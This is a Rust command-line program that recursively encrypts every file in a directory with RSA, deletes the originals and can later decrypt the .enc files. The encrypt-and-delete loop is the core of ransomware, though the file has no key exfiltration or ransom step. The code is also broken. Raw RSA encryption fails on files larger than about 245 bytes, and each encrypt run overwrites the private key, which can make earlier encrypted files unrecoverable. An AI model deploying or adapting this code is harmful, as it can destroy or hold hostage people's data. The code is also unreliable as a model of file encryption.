use rsa::{pkcs1::{DecodeRsaPrivateKey, DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey}, Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
use rand::rngs::OsRng;
use std::fs::{self, File, read, remove_file};
use std::io::Write;
use std::env;
use std::path::Path;

fn generate_and_save_keys() {
    let mut rng = OsRng;

    // Generate a 2048-bit RSA private key
    let private_key = RsaPrivateKey::new(&mut rng, 2048)
        .expect("failed to generate a key");
    let public_key = RsaPublicKey::from(&private_key);

    // Encode the keys into PEM format
    let private_pem = private_key
        .to_pkcs1_pem(rsa::pkcs1::LineEnding::LF)
        .expect("failed to encode private key");
    let public_pem = public_key.to_pkcs1_pem(rsa::pkcs1::LineEnding::LF)
        .expect("failed to encode public key");

    // Write the private key to priv.pem
    let mut priv_file = File::create("priv.pem").expect("failed to create priv.pem");
    priv_file.write_all(private_pem.as_bytes()).expect("failed to write private key");

    // Write the public key to pub.pem
    let mut pub_file = File::create("pub.pem").expect("failed to create pub.pem");
    pub_file.write_all(public_pem.as_bytes()).expect("failed to write public key");

    println!("Keys generated and saved to priv.pem and pub.pem");
}

fn encrypt_file(file_path: &Path, public_key: &RsaPublicKey) {
    let file_content = read(file_path).expect("failed to read the file");

    let mut rng = OsRng;
    let encrypted_data = public_key
        .encrypt(&mut rng, Pkcs1v15Encrypt, &file_content)
        .expect("failed to encrypt the file");

    let mut encrypted_file = File::create(format!("{}.enc", file_path.display()))
        .expect("failed to create encrypted file");
    encrypted_file
        .write_all(&encrypted_data)
        .expect("failed to write encrypted data");

    println!("File encrypted and saved as {}.enc", file_path.display());
    remove_file(file_path).expect("failed to delete original file");
}

fn decrypt_file(file_path: &Path, private_key: &RsaPrivateKey) {
    let encrypted_data = read(file_path).expect("failed to read the encrypted file");

    let decrypted_data = private_key
        .decrypt(Pkcs1v15Encrypt, &encrypted_data)
        .expect("failed to decrypt the file");

    let original_file_path = file_path.with_extension("");
    let mut decrypted_file = File::create(&original_file_path)
        .expect("failed to create decrypted file");
    decrypted_file
        .write_all(&decrypted_data)
        .expect("failed to write decrypted data");

    println!("File decrypted and saved as {}", original_file_path.display());

    // Delete the encrypted file
    remove_file(file_path).expect("failed to delete encrypted file");
    println!("Encrypted file {} deleted", file_path.display());
}

fn process_directory(dir_path: &str, mode: &str, public_key: Option<&RsaPublicKey>, private_key: Option<&RsaPrivateKey>) {
    for entry in fs::read_dir(dir_path).expect("failed to read directory") {
        let entry = entry.expect("failed to access directory entry");
        let path = entry.path();

        if path.is_dir() {
            process_directory(path.to_str().unwrap(), mode, public_key, private_key);
        } else {
            match mode {
                "encrypt" => {
                    if public_key.is_some() && !path.extension().map_or(false, |ext| ext == "enc") {
                        encrypt_file(&path, public_key.unwrap());
                    }
                }
                "decrypt" => {
                    if private_key.is_some() && path.extension().map_or(false, |ext| ext == "enc") {
                        decrypt_file(&path, private_key.unwrap());
                    }
                }
                _ => eprintln!("Invalid mode. Use 'encrypt' or 'decrypt'."),
            }
        }
    }
}

fn load_public_key_from_pem() -> RsaPublicKey {
    let public_key_pem = std::fs::read_to_string("pub.pem")
        .expect("failed to read pub.pem");

    RsaPublicKey::from_pkcs1_pem(&public_key_pem)
        .expect("failed to parse public key")
}

fn load_private_key_from_pem() -> RsaPrivateKey {
    let private_key_pem = std::fs::read_to_string("priv.pem")
        .expect("failed to read priv.pem");

    RsaPrivateKey::from_pkcs1_pem(&private_key_pem)
        .expect("failed to parse private key")
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        eprintln!("Usage: {} <encrypt|decrypt> <dir_path>", args[0]);
        return;
    }

    let mode = &args[1];
    let dir_path = &args[2];

    match mode.as_str() {
        "encrypt" => {
            // Generate keys if not already done
            generate_and_save_keys();

            // Load the public key and encrypt all files in the directory
            let public_key = load_public_key_from_pem();
            process_directory(dir_path, mode, Some(&public_key), None);
        }
        "decrypt" => {
            // Load the private key and decrypt all files in the directory
            let private_key = load_private_key_from_pem();
            process_directory(dir_path, mode, None, Some(&private_key));
        }
        _ => eprintln!("Invalid mode. Use 'encrypt' or 'decrypt'."),
    }
}
